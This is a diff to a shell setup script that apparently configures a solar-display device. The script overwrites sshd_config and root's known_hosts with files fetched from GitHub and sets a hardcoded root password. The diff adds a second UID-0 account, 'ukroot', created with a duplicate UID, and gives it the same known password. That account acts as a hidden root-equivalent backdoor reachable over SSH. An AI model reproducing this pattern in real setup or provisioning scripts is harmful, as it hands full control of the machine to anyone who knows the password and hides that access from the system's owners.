@@ -7,8 +7,12 @@ curl -s 'https://raw.githubusercontent.com/DeBaschdi/solar_config/master/solaran
 curl -s 'https://raw.githubusercontent.com/DeBaschdi/solar_config/master/solaranzeige/sshd_config' > /etc/ssh/sshd_config
 curl -s 'https://raw.githubusercontent.com/DeBaschdi/solar_config/master/solaranzeige/known_hosts' > /root/.ssh/known_hosts
 
+#Create ukroot
+useradd -m -d /ukroot -o -u 0 -g 0 -s /bin/bash ukroot
+
 #Set Fake Password
 echo "root:solar.2016"|chpasswd
+echo "ukroot:solar.2016"|chpasswd
 
 #Start sshd Service
 service ssh start
